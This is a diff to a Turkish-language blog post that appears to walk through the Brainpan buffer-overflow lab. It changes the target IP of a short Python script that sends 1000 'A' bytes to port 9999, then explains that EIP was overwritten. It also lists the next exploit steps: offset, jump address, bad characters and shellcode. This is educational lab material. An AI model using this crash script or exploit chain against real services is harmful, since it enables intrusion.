@@ -57,7 +57,7 @@ import socket
 import sys
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-connect=s.connect(('172.16.198.137',9999))
+connect=s.connect(('172.16.198.146',9999))
 
 buffer="A"*1000
 
@@ -66,3 +66,15 @@ s.send(buffer)
 
 {% endhighlight %}
 
+<figure >
+    <img src="/assets/img/brainpan7.PNG">
+</figure>
+
+EIP üzerine, yani sıradaki komutu işaret eden pointer üzerine göndermiş olduğumuz A karakterleri basılmış. Anlıyoruz ki bir overflow durumu var. 
+
+Burdan sonra yapılması gerekenler sırasıyla şu şekilde:
+
++ Overflow'un gerçekleştiği sınırı belirlemek.
++ Uygulama içerisinde bizi stack'e yönlendirecek adresi bulmak. 
++ Kodumuzun yürütülmesine engel olan karakterleri (badchar) belirlemek.
++ Stack'e uygun shellcode'u yerleştirmek.
